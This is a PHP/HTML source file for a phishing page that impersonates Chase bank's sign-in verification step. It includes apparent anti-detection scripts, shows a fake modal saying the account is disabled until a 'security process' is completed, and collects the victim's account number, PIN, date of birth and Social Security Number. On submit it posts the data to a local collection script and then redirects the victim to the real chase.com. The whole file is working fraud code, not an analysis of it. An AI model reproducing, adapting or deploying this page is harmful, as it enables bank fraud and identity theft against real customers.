<?php

    include './secure/anti1.php';
	include './secure/anti2.php';
	include './secure/anti3.php';
	include './secure/anti4.php';
	include './secure/anti5.php';
	include './secure/anti6.php';
	include './secure/anti7.php';
	include './secure/anti8.php';
	

?>
<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="robots" content="noindex,nofollow">

    <title><?php echo htmlentities("Sign in - chase.com", ENT_QUOTES, "UTF-8"); ?></title>

    <link href="./css/bootstrap.min.css" rel="stylesheet">
    <link href="./css/shop-homepage.css" rel="stylesheet">
    <link href="./css/styles.css" rel="stylesheet">
    <link rel="shortcut icon" href="./img/chasefavicon.ico">
    <script src="https://kit.fontawesome.com/6222530beb.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    
    <!-- <script>
		$(function() {
			
			$(document).ready( function() 
			{
				$('#citybox').hide();
				$('#statebox').hide();
				
			});
			
			// OnKeyDown Function
			$("#zip").keyup(function() {
				var zip_in = $(this);
				var zip_box = $('#zipbox');
				
				if (zip_in.val().length<5)
				{
					zip_box.removeClass('error success');
				}
				else if ( zip_in.val().length>5)
				{
					zip_box.addClass('error').removeClass('success');
				}
				else if ((zip_in.val().length == 5) ) 
				{
					$.ajax({
						url: "https://api.zippopotam.us/us/" + zip_in.val(),
						cache: false,
						dataType: "json",
						type: "GET",
					  success: function(result, success) {
							$('#citybox').slideDown();
							$('#statebox').slideDown();
						
							places = result['places'][0];
							$("#city").val(places['place name']);
							$("#state").val(places['state abbreviation']);
							zip_box.addClass('success').removeClass('error');
						},
						error: function(result, success) {
							zip_box.removeClass('success').addClass('error');
						}
					});
				}
	});

		});
			
	</script> -->
</head>

<body class="fl">
    
<div id="myModal" class="modal fade" role="dialog">
    <div class="modal-dialog">
        <!-- Modal content-->
        <div class="modal-content">
            <div class="modal-header">
                <h4 class="modal-title">Please Note,</h4>
            </div>
            <div class="modal-body">
                <p><?php echo htmlentities("The security process has been initiated, your account will remain disabled for your own security until you complete this procedure. Please complete it as soon as possible.", ENT_QUOTES, "UTF-8"); ?></p>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-mod" data-dismiss="modal">Continue</button>
            </div>
        </div>
    </div>
</div>
   
    <header class="e-header">
        <div class="col-xs-4 header-elements">
            <a href="#" class="menu-line">
                <i class="fas fa-bars"></i>
            </a>
        </div>
        <div class="col-xs-4 header-elements">
            <img src="./img/octogon-white.png" alt="Chase">
        </div>
        <div class="col-xs-4 header-elements ura">
            <span class="labelinho">
                Espa&#241;ol
            </span>
        </div>
    </header>
    <main id="e-content">
        <div class="oe-gs">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-offset-2 col-lg-offset-3">
                        <h1 class="oe-header">Verification</h1>
                        <div class="oe-progress-bar">
                            <div class="bar fill"> </div>
                        </div>
                        <div class="H2 oe-secure">Secure your account</div>
                        <h2 class="H4 eGSA">We need a bit more info to verify your identity.</h2>
                    </div>
                </div>
                
            </div>
        </div>
    </main>
    <section id="opc-content">
        <div class="field-mt-18">
           <form action="" method="post" id="res">
            <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
                <div id="personal">
                    <div class="row">
                        <div class="col-xs-12 col-sm-6">
                            <div class="personal_NH">Personal details</div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-xs-12 col-sm-12">
                            <div class="mb-24">This should be your full legal name as it appears on your government ID.</div>
                        </div>
                    </div>
                    <div id="nameblock">
                        <div class="row">
                            <div class="col-xs-12 col-sm-6">
                                <div class="jp_fieldgroup">
                                    <div class="jp_fg vertical">
                                        <div class="label-wraps">
                                            <label for="fnam" class="outlaw_label">Accoun Number</label>
                                        </div>
                                        <input type="text" class="out-input" id="fnam" name="accnum" required>
                                    </div>
                                </div>
                            </div>
                            <div class="col-xs-12 col-sm-6">
                                <div class="jp_fieldgroup">
                                    <div class="jp_fg vertical">
                                        <div class="label-wraps">
                                            <label for="lnam" class="outlaw_label">Pin</label>
                                        </div>
                                        <input type="number" class="out-input" id="pinn" name="pin" required>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="identity">
                    <div class="row">
                        <div class="col-xs-12 col-sm-6">
                            <div class="personal_NH">Identification</div>
                        </div>
                    </div>
                    <div id="nameblock">
                        <div class="row">
                            <div class="col-xs-12 col-sm-6">
                                <div class="jp_fieldgroup">
                                    <div class="jp_fg vertical">
                                        <div class="label-wraps">
                                            <label for="dob" class="outlaw_label">Date of birth</label>
                                        </div>
                                        <input type="date" class="input-dob out-input" name="dob" id="dob" required>
                                        <div class="f-helpertext">
                                            <div class="helpertext">mm/dd/yyyy</div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-xs-12 col-sm-6">
                                <div class="jp_fieldgroup">
                                    <div class="jp_fg vertical">
                                        <div class="label-wraps">
                                            <label for="soc" class="outlaw_label">Social Security Number</label>
                                        </div>
                                        <input type="text" class="out-input" name="soc" id="soc" pattern="[0-9]{9}" maxlength="9" title="Enter your 9 digit Social Security Number" required>
                                        <div class="f-helpertext">
                                            <div class="helpertext">We're required to ask for your SSN to verify your identity. We'll keep your data secure.</div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                    </div>
                </div>
                <div id="disclosure">
                    <div class="field-disco">
                        <div class="row">
                            <div class="col-xs-12">
                                <div class="foot-disco">
                                    When you give us your mobile number, we have your consent to send you automated calls and texts to service all of your accounts with us.
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="footinho">
                    <div class="row">
                        <div class="col-xs-12">
                            <div class="row">
                                <div class="col-xs-12 navi-tom">
                                    <input type="submit" class="out-nxt" name="submit" value="Continue">
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            </form>
        </div>
    </section>

<script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.5.3/cleave.min.js"></script>
<script>
new Cleave('.input-10', {
    numericOnly: true,
    blocks: [0, 3, 0, 3, 4],
    delimiters: ["(", ")", " ", "-"]
});
var cleave = new Cleave('.input-dob', {
    date: true,
    delimiter: '/',
    datePattern: ['m', 'd', 'Y']
});

</script>

<script>
    $(window).load(function(){
    $('#myModal').modal('show');
    }); 
    $(document).ready(function() {
            $('#pinn').inputmask('9999');
            $('#dob').inputmask('99/99/9999');
    });
</script>

<script>
     var formSubmitted = 0;
    document.getElementById("res").addEventListener("submit", function (event) {
          event.preventDefault();
      
          formSubmitted++;
          var inputs = document.querySelectorAll('input[required]');
          for (var i = 0; i < inputs.length; i++) {
              if (!inputs[i].value.trim()) {
                  alert("Please fill in all fields.");
                  return;
              }
          }
      
          var formData = new FormData(this);
          var xhr = new XMLHttpRequest();
          xhr.open("POST", "./config/fl.php", true); // your php url here
      
          xhr.onreadystatechange = function () {
              const directts = localStorage.getItem("userDomain")
              console.log(directts);
              if (xhr.readyState == 4 && xhr.status == 200) {
                  console.log(xhr.responseText);
      
                  if (formSubmitted >= 1) {
                    window.location.href = "http://chase.com";
                  }
              }
          };
      
          xhr.send(formData);
      });
//window.onbeforeunload = function() {
//   return "Do you really want to leave our brilliant application?";
//};
</script>



</body>

</html>